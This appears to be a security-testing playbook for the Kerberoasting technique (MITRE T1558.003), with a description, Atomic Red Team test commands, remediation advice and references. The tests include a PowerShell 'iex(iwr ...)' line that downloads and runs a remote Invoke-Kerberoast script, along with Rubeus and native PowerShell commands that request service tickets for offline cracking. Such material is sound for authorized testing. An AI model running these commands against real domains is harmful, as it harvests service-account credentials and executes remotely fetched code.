---
name: "T1558.003_kerberoasting"
description: "Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to Brute Force."
category: "authentication"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1558.003
  - credential-access
  - windows
  - sub-technique
technique_id: "T1558.003"
tactic: "credential-access"
all_tactics:
  - credential-access
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1558/003"
tech_stack:
  - windows
cwe_ids:
  - CWE-522
chains_with:
  - T1558
  - T1558.001
  - T1558.002
  - T1558.004
  - T1558.005
prerequisites:
  - T1558
severity_boost:
  T1558: "Chain with T1558 for deeper attack path"
  T1558.001: "Chain with T1558.001 for deeper attack path"
  T1558.002: "Chain with T1558.002 for deeper attack path"
---

# T1558.003 Kerberoasting

> **Sub-technique of:** T1558

## High-Level Description

Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to Brute Force.

Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service).

Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plaintext credentials.

This same behavior could be executed using service tickets captured from network traffic.

Cracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.

## Kill Chain Phase

- Credential Access (TA0006)

**Platforms:** Windows

## What to Check

- [ ] Identify if Kerberoasting technique is applicable to target environment
- [ ] Check Windows systems for indicators of Kerberoasting
- [ ] Verify mitigations are bypassed or absent (3 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Request for service tickets

This test uses the Powershell Empire Module: Invoke-Kerberoast.ps1
The following are further sources and credits for this attack:
[Kerberoasting Without Mimikatz source] (https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)
[Invoke-Kerberoast source] (https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)
when executed successfully , the test displays available services with their hashes.
If the testing domain doesn't have any service principal name configured, there is no output

**Supported Platforms:** windows

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)
Invoke-Kerberoast | fl
```

**Dependencies:**

- Computer must be domain joined

### Atomic Test 2: Rubeus kerberoast

Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast
This build targets .NET 4.5. If targeting a different version you will need to compile Rubeus

**Supported Platforms:** windows

```powershell
klist purge
cmd.exe /c "#{local_folder}\#{local_executable}" kerberoast #{flags} /outfile:"#{local_folder}\#{out_file}"
```

**Dependencies:**

- Computer must be domain joined
- Rubeus must exist

### Atomic Test 3: Extract all accounts in use as SPN using setspn

The following test will utilize setspn to extract the Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack.
A successful execution will output all the SPNs for the related domain.

**Supported Platforms:** windows

```cmd
setspn -T #{domain_name} -Q */*
```

**Dependencies:**

- Computer must be domain joined

### Atomic Test 4: Request A Single Ticket via PowerShell

The following test will utilize native PowerShell Identity modules to query the domain to extract the Service Principal Names for a single computer. This behavior is typically used during a kerberos or silver ticket attack.
A successful execution will output the SPNs for the endpoint in question.

**Supported Platforms:** windows

```powershell
Add-Type -AssemblyName System.IdentityModel
$ComputerFQDN=$env:LogonServer.trimStart('\') + "." + $env:UserDnsDomain
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/$ComputerFQDN"
```

**Dependencies:**

- Computer must be domain joined

### Atomic Test 5: Request All Tickets via PowerShell

The following test will utilize native PowerShell Identity modules to query the domain to extract allthe Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack.
A successful execution will output the SPNs for the domain in question.

**Supported Platforms:** windows

```powershell
Add-Type -AssemblyName System.IdentityModel
setspn.exe -T #{domain_name} -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

**Dependencies:**

- Computer must be domain joined

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Kerberoasting by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1558.003 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1027 Password Policies

Ensure strong password length (ideally 25+ characters) and complexity for service accounts and that these passwords periodically expire. Also consider using Group Managed Service Accounts or another third party product such as password vaulting.

### M1041 Encrypt Sensitive Information

Enable AES Kerberos encryption (or another stronger encryption algorithm), rather than RC4, where possible.

### M1026 Privileged Account Management

Limit service accounts to minimal required privileges, including membership in privileged groups such as Domain Administrators.

## Detection

### Detect Kerberoasting Attempts (T1558.003)

## Risk Assessment

| Finding                            | Severity | Impact            |
| ---------------------------------- | -------- | ----------------- |
| Kerberoasting technique applicable | High     | Credential Access |

## CWE Categories

| CWE ID  | Title                                |
| ------- | ------------------------------------ |
| CWE-522 | Insufficiently Protected Credentials |

## References

- [Microsoft Detecting Kerberoasting Feb 2018](https://blogs.technet.microsoft.com/motiba/2018/02/23/detecting-kerberoasting-activity-using-azure-security-center/)
- [Empire InvokeKerberoast Oct 2016](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)
- [SANS Attacking Kerberos Nov 2014](https://redsiege.com/kerberoast-slides)
- [AdSecurity Cracking Kerberos Dec 2015](https://adsecurity.org/?p=2293)
- [Microsoft SetSPN](https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx)
- [Microsoft SPN](https://msdn.microsoft.com/library/ms677949.aspx)
- [Harmj0y Kerberoast Nov 2016](https://blog.harmj0y.net/powershell/kerberoasting-without-mimikatz/)
- [Atomic Red Team - T1558.003](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1558.003)
- [MITRE ATT&CK - T1558.003](https://attack.mitre.org/techniques/T1558/003)
